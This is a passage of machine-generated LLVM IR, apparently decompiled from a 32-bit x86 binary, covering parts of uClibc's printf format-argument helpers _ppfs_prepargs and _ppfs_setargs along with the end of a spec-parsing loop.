  %v4_8052d3a = add i32 %v3_8052d3a, -1
  store i32 %v4_8052d3a, i32* %v2_8052d3a, align 4
  %v0_8052d40 = load i32, i32* @esi, align 4
  %v1_8052d40 = load i32, i32* @ebx, align 4
  %v2_8052d40 = inttoptr i32 %v1_8052d40 to i32*
  store i32 %v0_8052d40, i32* %v2_8052d40, align 4
  %v0_8052d42.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d42

dec_label_pc_8052d42:                             ; preds = %dec_label_pc_8052d42, %entry
  %v0_8052d42 = phi i32 [ %v1_8052d48, %dec_label_pc_8052d42 ], [ %v0_8052d42.pre, %entry ]
  %v1_8052d42 = inttoptr i32 %v0_8052d42 to i32*
  store i32 8, i32* %v1_8052d42, align 4
  %v0_8052d48 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d48 = add i32 %v0_8052d48, 4
  store i32 %v1_8052d48, i32* %eax.global-to-local, align 4
  %v0_8052d4b = load i32, i32* %edx.global-to-local, align 4
  %v1_8052d4b = add i32 %v0_8052d4b, -1
  %v8_8052d4b = icmp eq i32 %v1_8052d4b, 0
  store i32 %v1_8052d4b, i32* %edx.global-to-local, align 4
  %v1_8052d4c = icmp eq i1 %v8_8052d4b, false
  br i1 %v1_8052d4c, label %dec_label_pc_8052d42, label %dec_label_pc_8052d4e

dec_label_pc_8052d4e:                             ; preds = %dec_label_pc_8052d42
  %v0_8052d4e = load i32, i32* @esi, align 4
  store i32 %v0_8052d4e, i32* %eax.global-to-local, align 4
  %v1_8052d7920 = inttoptr i32 %v0_8052d4e to i8*
  %v2_8052d7921 = load i8, i8* %v1_8052d7920, align 1
  %v3_8052d7922 = zext i8 %v2_8052d7921 to i32
  %v5_8052d7923 = and i32 %v1_8052d4b, -256
  %v6_8052d7924 = or i32 %v3_8052d7922, %v5_8052d7923
  store i32 %v6_8052d7924, i32* %edx.global-to-local, align 4
  %v4_8052d7b25 = icmp eq i8 %v2_8052d7921, 0
  %v1_8052d7d27 = icmp eq i1 %v4_8052d7b25, false
  br i1 %v1_8052d7d27, label %dec_label_pc_8052d57, label %dec_label_pc_8052d7f

dec_label_pc_8052d57:                             ; preds = %dec_label_pc_8052d4e, %dec_label_pc_8052d79.backedge
  %v6_8052d7930 = phi i32 [ %v6_8052d79, %dec_label_pc_8052d79.backedge ], [ %v6_8052d7924, %dec_label_pc_8052d4e ]
  %v2_8052d7929 = phi i8 [ %v2_8052d79, %dec_label_pc_8052d79.backedge ], [ %v2_8052d7921, %dec_label_pc_8052d4e ]
  %v0_8052d5c28 = phi i32 [ %v0_8052d5c.be, %dec_label_pc_8052d79.backedge ], [ %v0_8052d4e, %dec_label_pc_8052d4e ]
  %v10_8052d57 = icmp eq i8 %v2_8052d7929, 37
  %v1_8052d5a = icmp eq i1 %v10_8052d57, false
  br i1 %v1_8052d5a, label %dec_label_pc_8052d78, label %dec_label_pc_8052d5c

dec_label_pc_8052d5c:                             ; preds = %dec_label_pc_8052d57
  %v1_8052d5c = add i32 %v0_8052d5c28, 1
  store i32 %v1_8052d5c, i32* %eax.global-to-local, align 4
  %v1_8052d5d = inttoptr i32 %v1_8052d5c to i8*
  %v2_8052d5d = load i8, i8* %v1_8052d5d, align 1
  %v11_8052d5d = icmp eq i8 %v2_8052d5d, 37
  br i1 %v11_8052d5d, label %dec_label_pc_8052d78, label %dec_label_pc_8052d62

dec_label_pc_8052d62:                             ; preds = %dec_label_pc_8052d5c
  %v1_8052d65 = load i32, i32* @ebx, align 4
  %v2_8052d65 = inttoptr i32 %v1_8052d65 to i32*
  store i32 %v1_8052d5c, i32* %v2_8052d65, align 4
  %v0_8052d67 = load i32, i32* @ebx, align 4
  %v1_8052d68 = inttoptr i32 %v0_8052d67 to i32*
  %v2_8052d68 = call i32 @_ppfs_parsespec(i32* %v1_8052d68)
  store i32 %v2_8052d68, i32* %eax.global-to-local, align 4
  %v2_8052d70 = icmp slt i32 %v2_8052d68, 0
  br i1 %v2_8052d70, label %dec_label_pc_8052d83, label %dec_label_pc_8052d74

dec_label_pc_8052d74:                             ; preds = %dec_label_pc_8052d62
  %v0_8052d74 = load i32, i32* @ebx, align 4
  %v1_8052d74 = inttoptr i32 %v0_8052d74 to i32*
  %v2_8052d74 = load i32, i32* %v1_8052d74, align 4
  %v4_8052d79.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052d79.backedge

dec_label_pc_8052d78:                             ; preds = %dec_label_pc_8052d5c, %dec_label_pc_8052d57
  %v0_8052d78 = phi i32 [ %v1_8052d5c, %dec_label_pc_8052d5c ], [ %v0_8052d5c28, %dec_label_pc_8052d57 ]
  %v1_8052d78 = add i32 %v0_8052d78, 1
  br label %dec_label_pc_8052d79.backedge

dec_label_pc_8052d79.backedge:                    ; preds = %dec_label_pc_8052d78, %dec_label_pc_8052d74
  %v4_8052d79.be = phi i32 [ %v4_8052d79.pre.pre, %dec_label_pc_8052d74 ], [ %v6_8052d7930, %dec_label_pc_8052d78 ]
  %v0_8052d5c.be = phi i32 [ %v2_8052d74, %dec_label_pc_8052d74 ], [ %v1_8052d78, %dec_label_pc_8052d78 ]
  store i32 %v0_8052d5c.be, i32* %eax.global-to-local, align 4
  %v1_8052d79 = inttoptr i32 %v0_8052d5c.be to i8*
  %v2_8052d79 = load i8, i8* %v1_8052d79, align 1
  %v3_8052d79 = zext i8 %v2_8052d79 to i32
  %v5_8052d79 = and i32 %v4_8052d79.be, -256
  %v6_8052d79 = or i32 %v3_8052d79, %v5_8052d79
  store i32 %v6_8052d79, i32* %edx.global-to-local, align 4
  %v4_8052d7b = icmp eq i8 %v2_8052d79, 0
  %v1_8052d7d = icmp eq i1 %v4_8052d7b, false
  br i1 %v1_8052d7d, label %dec_label_pc_8052d57, label %dec_label_pc_8052d79.dec_label_pc_8052d7f_crit_edge

dec_label_pc_8052d79.dec_label_pc_8052d7f_crit_edge: ; preds = %dec_label_pc_8052d79.backedge
  %v0_8052d7f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052d7f

dec_label_pc_8052d7f:                             ; preds = %dec_label_pc_8052d79.dec_label_pc_8052d7f_crit_edge, %dec_label_pc_8052d4e
  %v0_8052d7f = phi i32 [ %v0_8052d7f.pre, %dec_label_pc_8052d79.dec_label_pc_8052d7f_crit_edge ], [ %v0_8052d4e, %dec_label_pc_8052d4e ]
  %v1_8052d7f = load i32, i32* @ebx, align 4
  %v2_8052d7f = inttoptr i32 %v1_8052d7f to i32*
  store i32 %v0_8052d7f, i32* %v2_8052d7f, align 4
  br label %dec_label_pc_8052d83

dec_label_pc_8052d83:                             ; preds = %dec_label_pc_8052d62, %dec_label_pc_8052d7f
  %storemerge = phi i32 [ 0, %dec_label_pc_8052d7f ], [ -1, %dec_label_pc_8052d62 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8052d83 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052d83, i32* @edx, align 4
  %v2_8052d84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052d84, i32* @ebx, align 4
  store i32 %v0_8052d18, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8052d79, { 1, 0 }
  uselistorder i8 %v2_8052d79, { 1, 2, 0 }
  uselistorder i32 %v0_8052d5c.be, { 2, 1, 0 }
  uselistorder i32 %v0_8052d5c28, { 1, 0 }
  uselistorder i32 %v0_8052d4e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8052d4b, { 0, 2, 1 }
  uselistorder i32 %v1_8052d48, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 7, 6, 8 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_8052d83, { 1, 0 }
  uselistorder label %dec_label_pc_8052d57, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8052d88 = load i32, i32* @esi, align 4
  %v0_8052d89 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8052d95 = add i32 %arg1, 24
  %v2_8052d95 = inttoptr i32 %v1_8052d95 to i32*
  %v3_8052d95 = load i32, i32* %v2_8052d95, align 4
  %v2_8052d98 = add i32 %arg1, 76
  %v3_8052d98 = inttoptr i32 %v2_8052d98 to i32*
  store i32 %arg2, i32* %v3_8052d98, align 4
  %tmp8 = icmp slt i32 %v3_8052d95, 1
  br i1 %tmp8, label %dec_label_pc_8052dc6, label %dec_label_pc_8052d9f

dec_label_pc_8052d9f:                             ; preds = %entry
  %v1_8052da2 = load i32, i32* @ebx, align 4
  %v2_8052da2 = add i32 %v1_8052da2, 28
  %v3_8052da2 = inttoptr i32 %v2_8052da2 to i32*
  store i32 %v3_8052d95, i32* %v3_8052da2, align 4
  %v0_8052da5 = load i32, i32* @ebx, align 4
  %v1_8052da5 = add i32 %v0_8052da5, 24
  %v2_8052da5 = inttoptr i32 %v1_8052da5 to i32*
  store i32 0, i32* %v2_8052da5, align 4
  %v0_8052dac = load i32, i32* @ebx, align 4
  %v1_8052dac = add i32 %v0_8052dac, 4
  %v2_8052dac = inttoptr i32 %v1_8052dac to i32*
  store i32 0, i32* %v2_8052dac, align 4
  %v0_8052db3 = load i32, i32* @ebx, align 4
  %v1_8052db3 = add i32 %v0_8052db3, 8
  %v2_8052db3 = inttoptr i32 %v1_8052db3 to i32*
  store i32 0, i32* %v2_8052db3, align 4
  %v0_8052dba = load i32, i32* @ebx, align 4
  %v1_8052dbb = call i32 @_ppfs_setargs(i32 %v0_8052dba)
  %v1_8052dc3 = load i32, i32* @ebx, align 4
  %v2_8052dc3 = add i32 %v1_8052dc3, 24
  %v3_8052dc3 = inttoptr i32 %v2_8052dc3 to i32*
  store i32 %v3_8052d95, i32* %v3_8052dc3, align 4
  br label %dec_label_pc_8052dc6

dec_label_pc_8052dc6:                             ; preds = %entry, %dec_label_pc_8052d9f
  %v2_8052dc6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8052d89, i32* @ebx, align 4
  store i32 %v0_8052d88, i32* @esi, align 4
  ret i32 %v2_8052dc6

; uselistorder directives
  uselistorder i32 %v3_8052d95, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052dc6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052dcd = load i32, i32* @ebx, align 4
  store i32 %v0_8052dcd, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8052dd2 = add i32 %arg1, 24
  %v2_8052dd2 = inttoptr i32 %v1_8052dd2 to i32*
  %v3_8052dd2 = load i32, i32* %v2_8052dd2, align 4
  %v4_8052dd2 = icmp eq i32 %v3_8052dd2, 0
  %v1_8052dd6 = add i32 %arg1, 80
  store i32 %v1_8052dd6, i32* %ebx.global-to-local, align 4
  %v1_8052dd9 = icmp eq i1 %v4_8052dd2, false
  %v1_8052e91 = add i32 %arg1, 8
  %v2_8052e91 = inttoptr i32 %v1_8052e91 to i32*
  %v3_8052e91 = load i32, i32* %v2_8052e91, align 4
  %v8_8052e91 = icmp eq i32 %v3_8052e91, -2147483648
  %v1_8052e98 = icmp eq i1 %v8_8052e91, false
  br i1 %v1_8052dd9, label %dec_label_pc_8052e91, label %dec_label_pc_8052ddf

dec_label_pc_8052ddf:                             ; preds = %entry
  br i1 %v1_8052e98, label %dec_label_pc_8052df9, label %dec_label_pc_8052de8

dec_label_pc_8052de8:                             ; preds = %dec_label_pc_8052ddf
  %v1_8052de8 = add i32 %arg1, 76
  %v2_8052de8 = inttoptr i32 %v1_8052de8 to i32*
  %v3_8052de8 = load i32, i32* %v2_8052de8, align 4
  store i32 %v3_8052de8, i32* %eax.global-to-local, align 4
  %v1_8052deb = add i32 %v3_8052de8, 4
  store i32 %v1_8052deb, i32* %edx.global-to-local, align 4
  store i32 %v1_8052deb, i32* %v2_8052de8, align 4
  %v0_8052df1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052df1 = inttoptr i32 %v0_8052df1 to i32*
  %v2_8052df1 = load i32, i32* %v1_8052df1, align 4
  store i32 %v2_8052df1, i32* %eax.global-to-local, align 4
  %v1_8052df3 = load i32, i32* @ecx, align 4
  %v2_8052df3 = add i32 %v1_8052df3, 80
  %v3_8052df3 = inttoptr i32 %v2_8052df3 to i32*
  store i32 %v2_8052df1, i32* %v3_8052df3, align 4
  %v0_8052df6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052df6 = load i32, i32* @ecx, align 4
  %v2_8052df6 = add i32 %v1_8052df6, 8
  %v3_8052df6 = inttoptr i32 %v2_8052df6 to i32*
  store i32 %v0_8052df6, i32* %v3_8052df6, align 4
  %v0_8052df9.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052df9

dec_label_pc_8052df9:                             ; preds = %dec_label_pc_8052ddf, %dec_label_pc_8052de8
  %v1_8052e08 = phi i32 [ %arg1, %dec_label_pc_8052ddf ], [ %v0_8052df9.pre, %dec_label_pc_8052de8 ]
  %v1_8052df9 = add i32 %v1_8052e08, 4
  %v2_8052df9 = inttoptr i32 %v1_8052df9 to i32*
  %v3_8052df9 = load i32, i32* %v2_8052df9, align 4
  %v8_8052df9 = icmp eq i32 %v3_8052df9, -2147483648
  %v1_8052e00 = icmp eq i1 %v8_8052df9, false
  br i1 %v1_8052e00, label %dec_label_pc_8052e13, label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052df9
  %v1_8052e02 = add i32 %v1_8052e08, 76
  %v2_8052e02 = inttoptr i32 %v1_8052e02 to i32*
  %v3_8052e02 = load i32, i32* %v2_8052e02, align 4
  store i32 %v3_8052e02, i32* %eax.global-to-local, align 4
  %v1_8052e05 = add i32 %v3_8052e02, 4
  store i32 %v1_8052e05, i32* %edx.global-to-local, align 4
  store i32 %v1_8052e05, i32* %v2_8052e02, align 4
  %v0_8052e0b = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e0b = inttoptr i32 %v0_8052e0b to i32*
  %v2_8052e0b = load i32, i32* %v1_8052e0b, align 4
  store i32 %v2_8052e0b, i32* %eax.global-to-local, align 4
  %v1_8052e0d = load i32, i32* @ecx, align 4
  %v2_8052e0d = add i32 %v1_8052e0d, 80
  %v3_8052e0d = inttoptr i32 %v2_8052e0d to i32*
  store i32 %v2_8052e0b, i32* %v3_8052e0d, align 4
  %v0_8052e10 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e10 = load i32, i32* @ecx, align 4
  %v2_8052e10 = add i32 %v1_8052e10, 4
  %v3_8052e10 = inttoptr i32 %v2_8052e10 to i32*
  store i32 %v0_8052e10, i32* %v3_8052e10, align 4
  %v1_8052e8a15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052e13

dec_label_pc_8052e13:                             ; preds = %dec_label_pc_8052df9, %dec_label_pc_8052e02
  %v1_8052e8a15 = phi i32 [ %v1_8052e08, %dec_label_pc_8052df9 ], [ %v1_8052e8a15.pre, %dec_label_pc_8052e02 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8052e8a16 = add i32 %v1_8052e8a15, 28
  %v3_8052e8a17 = inttoptr i32 %v2_8052e8a16 to i32*
  %v4_8052e8a18 = load i32, i32* %v3_8052e8a17, align 4
  %v5_8052e8d20 = icmp sgt i32 %v4_8052e8a18, 0
  br i1 %v5_8052e8d20, label %dec_label_pc_8052e17, label %dec_label_pc_8052ebf.loopexit

dec_label_pc_8052e17:                             ; preds = %dec_label_pc_8052e13, %dec_label_pc_8052e89
  %v1_8052e8a22 = phi i32 [ %v1_8052e8a, %dec_label_pc_8052e89 ], [ %v1_8052e8a15, %dec_label_pc_8052e13 ]
  %v1_8052e1721 = phi i32 [ %v1_8052e89, %dec_label_pc_8052e89 ], [ 0, %dec_label_pc_8052e13 ]
  %v2_8052e17 = mul i32 %v1_8052e1721, 4
  %v3_8052e17 = add i32 %v2_8052e17, 40
  %v4_8052e17 = add i32 %v3_8052e17, %v1_8052e8a22
  %v5_8052e17 = inttoptr i32 %v4_8052e17 to i32*
  %v6_8052e17 = load i32, i32* %v5_8052e17, align 4
  store i32 %v6_8052e17, i32* %eax.global-to-local, align 4
  %v1_8052e1b = add i32 %v6_8052e17, -8
  %v9_8052e1b = icmp eq i32 %v1_8052e1b, 0
  br i1 %v9_8052e1b, label %dec_label_pc_8052e89, label %dec_label_pc_8052e20

dec_label_pc_8052e20:                             ; preds = %dec_label_pc_8052e17
  %v10_8052e1b = icmp slt i32 %v1_8052e1b, 0
  %v6_8052e1b = sub i32 7, %v6_8052e17
  %v7_8052e1b = and i32 %v6_8052e1b, %v6_8052e17
  %v8_8052e1b = icmp slt i32 %v7_8052e1b, 0
  %v1_8052e20 = add i32 %v1_8052e8a22, 76
  %v2_8052e20 = inttoptr i32 %v1_8052e20 to i32*
  %v3_8052e20 = load i32, i32* %v2_8052e20, align 4
  store i32 %v3_8052e20, i32* %edx.global-to-local, align 4
  %v3_8052e23 = icmp eq i1 %v10_8052e1b, %v8_8052e1b
  br i1 %v3_8052e23, label %dec_label_pc_8052e33, label %dec_label_pc_8052e25

dec_label_pc_8052e25:                             ; preds = %dec_label_pc_8052e20
  %tmp13 = icmp slt i32 %v6_8052e17, 3
  %v9_8052e2c = icmp eq i32 %v6_8052e17, 7
  %v1_8052e2f = icmp eq i1 %v9_8052e2c, false
  %or.cond = or i1 %tmp13, %v1_8052e2f
  br i1 %or.cond, label %dec_label_pc_8052e7c, label %dec_label_pc_8052e5e

dec_label_pc_8052e33:                             ; preds = %dec_label_pc_8052e20
  %tmp14 = icmp sgt i32 %v6_8052e17, 1024
  br i1 %tmp14, label %dec_label_pc_8052e3c, label %dec_label_pc_8052e7c

dec_label_pc_8052e3c:                             ; preds = %dec_label_pc_8052e33
  %v6_8052e3c = icmp eq i32 %v6_8052e17, 2048
  br i1 %v6_8052e3c, label %dec_label_pc_8052e4c, label %dec_label_pc_8052e43

dec_label_pc_8052e43:                             ; preds = %dec_label_pc_8052e3c
  %v9_8052e43 = icmp eq i32 %v6_8052e17, 2055
  %v1_8052e48 = icmp eq i1 %v9_8052e43, false
  br i1 %v1_8052e48, label %dec_label_pc_8052e7c, label %dec_label_pc_8052e6d

dec_label_pc_8052e4c:                             ; preds = %dec_label_pc_8052e3c
  %v1_8052e4c = add i32 %v3_8052e20, 8
  store i32 %v1_8052e4c, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e4c, i32* %v2_8052e20, align 4
  %v0_8052e52 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e52 = inttoptr i32 %v0_8052e52 to i32*
  %v2_8052e52 = load i32, i32* %v1_8052e52, align 4
  store i32 %v2_8052e52, i32* %eax.global-to-local, align 4
  %v1_8052e54 = add i32 %v0_8052e52, 4
  %v2_8052e54 = inttoptr i32 %v1_8052e54 to i32*
  %v3_8052e54 = load i32, i32* %v2_8052e54, align 4
  store i32 %v3_8052e54, i32* %edx.global-to-local, align 4
  %v1_8052e57 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e57 = inttoptr i32 %v1_8052e57 to i32*
  store i32 %v2_8052e52, i32* %v2_8052e57, align 4
  %v0_8052e59 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e59 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e59 = add i32 %v1_8052e59, 4
  %v3_8052e59 = inttoptr i32 %v2_8052e59 to i32*
  store i32 %v0_8052e59, i32* %v3_8052e59, align 4
  br label %dec_label_pc_8052e86

dec_label_pc_8052e5e:                             ; preds = %dec_label_pc_8052e25
  %v3_8052e5e = load i32, i32* %v2_8052e20, align 4
  store i32 %v3_8052e5e, i32* %edx.global-to-local, align 4
  %v1_8052e61 = add i32 %v3_8052e5e, 8
  store i32 %v1_8052e61, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e61, i32* %v2_8052e20, align 4
  %v0_8052e67 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e67 = inttoptr i32 %v0_8052e67 to double*
  %v2_8052e67 = load double, double* %v1_8052e67, align 4
  %v2_8052e69 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8052e69 = inttoptr i32 %v2_8052e69 to double*
  store double %v2_8052e67, double* %v4_8052e69, align 4
  br label %dec_label_pc_8052e86

dec_label_pc_8052e6d:                             ; preds = %dec_label_pc_8052e43
  %v3_8052e6d = load i32, i32* %v2_8052e20, align 4
  store i32 %v3_8052e6d, i32* %edx.global-to-local, align 4
  %v1_8052e70 = add i32 %v3_8052e6d, 12
  store i32 %v1_8052e70, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e70, i32* %v2_8052e20, align 4
  %v0_8052e76 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e76 = inttoptr i32 %v0_8052e76 to x86_fp80*
  %v2_8052e76 = load x86_fp80, x86_fp80* %v1_8052e76, align 4
  %v2_8052e78 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052e78 = inttoptr i32 %v2_8052e78 to x86_fp80*
  store x86_fp80 %v2_8052e76, x86_fp80* %v3_8052e78, align 4
  br label %dec_label_pc_8052e86

dec_label_pc_8052e7c:                             ; preds = %dec_label_pc_8052e25, %dec_label_pc_8052e33, %dec_label_pc_8052e43
  %v1_8052e7c = add i32 %v3_8052e20, 4
  store i32 %v1_8052e7c, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e7c, i32* %v2_8052e20, align 4
  %v0_8052e82 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e82 = inttoptr i32 %v0_8052e82 to i32*
  %v2_8052e82 = load i32, i32* %v1_8052e82, align 4
  store i32 %v2_8052e82, i32* %eax.global-to-local, align 4
  %v1_8052e84 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052e84 = inttoptr i32 %v1_8052e84 to i32*
  store i32 %v2_8052e82, i32* %v2_8052e84, align 4
  br label %dec_label_pc_8052e86

dec_label_pc_8052e86:                             ; preds = %dec_label_pc_8052e6d, %dec_label_pc_8052e5e, %dec_label_pc_8052e4c, %dec_label_pc_8052e7c
  %v0_8052e86 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e86 = add i32 %v0_8052e86, 12
  store i32 %v1_8052e86, i32* %ebx.global-to-local, align 4
  %v0_8052e89.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e8a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052e89

dec_label_pc_8052e89:                             ; preds = %dec_label_pc_8052e17, %dec_label_pc_8052e86
  %v1_8052e8a = phi i32 [ %v1_8052e8a22, %dec_label_pc_8052e17 ], [ %v1_8052e8a.pre, %dec_label_pc_8052e86 ]
  %v0_8052e89 = phi i32 [ %v1_8052e1721, %dec_label_pc_8052e17 ], [ %v0_8052e89.pre, %dec_label_pc_8052e86 ]
  %v1_8052e89 = add i32 %v0_8052e89, 1
  store i32 %v1_8052e89, i32* %esi.global-to-local, align 4
  %v2_8052e8a = add i32 %v1_8052e8a, 28
  %v3_8052e8a = inttoptr i32 %v2_8052e8a to i32*
  %v4_8052e8a = load i32, i32* %v3_8052e8a, align 4
  %v5_8052e8d = icmp slt i32 %v1_8052e89, %v4_8052e8a
  br i1 %v5_8052e8d, label %dec_label_pc_8052e17, label %dec_label_pc_8052e8a.dec_label_pc_8052ebf.loopexit_crit_edge

dec_label_pc_8052e91:                             ; preds = %entry
  br i1 %v1_8052e98, label %dec_label_pc_8052ea8, label %dec_label_pc_8052e9a

dec_label_pc_8052e9a:                             ; preds = %dec_label_pc_8052e91
  %v1_8052e9a = add i32 %arg1, 36
  %v2_8052e9a = inttoptr i32 %v1_8052e9a to i8*
  %v3_8052e9a = load i8, i8* %v2_8052e9a, align 1
  %v2_8052e9e = zext i8 %v3_8052e9a to i32
  %v3_8052e9e = mul nuw nsw i32 %v2_8052e9e, 12
  store i32 %v3_8052e9e, i32* %eax.global-to-local, align 4
  %v2_8052ea1 = add i32 %arg1, 68
  %v3_8052ea1 = add i32 %v2_8052ea1, %v3_8052e9e
  %v4_8052ea1 = inttoptr i32 %v3_8052ea1 to i32*
  %v5_8052ea1 = load i32, i32* %v4_8052ea1, align 4
  store i32 %v5_8052ea1, i32* %eax.global-to-local, align 4
  store i32 %v5_8052ea1, i32* %v2_8052e91, align 4
  %v0_8052ea8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052ea8

dec_label_pc_8052ea8:                             ; preds = %dec_label_pc_8052e91, %dec_label_pc_8052e9a
  %v1_8052ebc = phi i32 [ %arg1, %dec_label_pc_8052e91 ], [ %v0_8052ea8.pre, %dec_label_pc_8052e9a ]
  %v1_8052ea8 = add i32 %v1_8052ebc, 4
  %v2_8052ea8 = inttoptr i32 %v1_8052ea8 to i32*
  %v3_8052ea8 = load i32, i32* %v2_8052ea8, align 4
  %v8_8052ea8 = icmp eq i32 %v3_8052ea8, -2147483648
  %v1_8052eaf = icmp eq i1 %v8_8052ea8, false
  br i1 %v1_8052eaf, label %dec_label_pc_8052ebf, label %dec_label_pc_8052eb1

dec_label_pc_8052eb1:                             ; preds = %dec_label_pc_8052ea8
  %v1_8052eb1 = add i32 %v1_8052ebc, 37
  %v2_8052eb1 = inttoptr i32 %v1_8052eb1 to i8*
  %v3_8052eb1 = load i8, i8* %v2_8052eb1, align 1
  %v2_8052eb5 = zext i8 %v3_8052eb1 to i32
  %v3_8052eb5 = mul nuw nsw i32 %v2_8052eb5, 12
  store i32 %v3_8052eb5, i32* %eax.global-to-local, align 4
  %v1_8052eb8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052eb8 = add nsw i32 %v3_8052eb5, -12
  %v3_8052eb8 = add i32 %v2_8052eb8, %v1_8052eb8
  %v4_8052eb8 = inttoptr i32 %v3_8052eb8 to i32*
  %v5_8052eb8 = load i32, i32* %v4_8052eb8, align 4
  store i32 %v5_8052eb8, i32* %eax.global-to-local, align 4
  store i32 %v5_8052eb8, i32* %v2_8052ea8, align 4
  %v0_8052ebf.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052ebf

dec_label_pc_8052e8a.dec_label_pc_8052ebf.loopexit_crit_edge: ; preds = %dec_label_pc_8052e89
  br label %dec_label_pc_8052ebf.loopexit

dec_label_pc_8052ebf.loopexit:                    ; preds = %dec_label_pc_8052e8a.dec_label_pc_8052ebf.loopexit_crit_edge, %dec_label_pc_8052e13
  %v1_8052e8a.lcssa = phi i32 [ %v1_8052e8a, %dec_label_pc_8052e8a.dec_label_pc_8052ebf.loopexit_crit_edge ], [ %v1_8052e8a15, %dec_label_pc_8052e13 ]
  br label %dec_label_pc_8052ebf

dec_label_pc_8052ebf:                             ; preds = %dec_label_pc_8052ebf.loopexit, %dec_label_pc_8052ea8, %dec_label_pc_8052eb1
  %v10_8052ec6 = phi i32 [ %v1_8052e8a.lcssa, %dec_label_pc_8052ebf.loopexit ], [ %v1_8052ebc, %dec_label_pc_8052ea8 ], [ %v0_8052ebf.pre, %dec_label_pc_8052eb1 ]
  %v1_8052ebf = add i32 %v10_8052ec6, 8
  %v2_8052ebf = inttoptr i32 %v1_8052ebf to i32*
  %v3_8052ebf = load i32, i32* %v2_8052ebf, align 4
  store i32 %v3_8052ebf, i32* %eax.global-to-local, align 4
  %v2_8052ec2 = icmp slt i32 %v3_8052ebf, 0
  %v1_8052ec4 = icmp eq i1 %v2_8052ec2, false
  br i1 %v1_8052ec4, label %dec_label_pc_8052eda, label %dec_label_pc_8052ec6

dec_label_pc_8052ec6:                             ; preds = %dec_label_pc_8052ebf
  %v1_8052ec6 = add i32 %v10_8052ec6, 16
  %v2_8052ec6 = inttoptr i32 %v1_8052ec6 to i32*
  %v3_8052ec6 = load i32, i32* %v2_8052ec6, align 4
  %v4_8052ec6 = or i32 %v3_8052ec6, 8
  store i32 %v4_8052ec6, i32* %v2_8052ec6, align 4
  %v0_8052eca = load i32, i32* %eax.global-to-local, align 4
  %v1_8052eca = sub i32 0, %v0_8052eca
  store i32 %v1_8052eca, i32* %eax.global-to-local, align 4
  %v1_8052ecc = load i32, i32* @ecx, align 4
  %v2_8052ecc = add i32 %v1_8052ecc, 8
  %v3_8052ecc = inttoptr i32 %v2_8052ecc to i32*
  store i32 %v1_8052eca, i32* %v3_8052ecc, align 4
  %v0_8052ecf = load i32, i32* @ecx, align 4
  %v1_8052ecf = add i32 %v0_8052ecf, 16
  %v2_8052ecf = inttoptr i32 %v1_8052ecf to i32*
  %v3_8052ecf = load i32, i32* %v2_8052ecf, align 4
  %v4_8052ecf = and i32 %v3_8052ecf, -2
  store i32 %v4_8052ecf, i32* %v2_8052ecf, align 4
  %v0_8052ed3 = load i32, i32* @ecx, align 4
  %v1_8052ed3 = add i32 %v0_8052ed3, 20
  %v2_8052ed3 = inttoptr i32 %v1_8052ed3 to i32*
  store i32 32, i32* %v2_8052ed3, align 4
  %v0_8052edc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052eda

dec_label_pc_8052eda:                             ; preds = %dec_label_pc_8052ebf, %dec_label_pc_8052ec6
  %v0_8052edc = phi i32 [ %v3_8052ebf, %dec_label_pc_8052ebf ], [ %v0_8052edc.pre, %dec_label_pc_8052ec6 ]
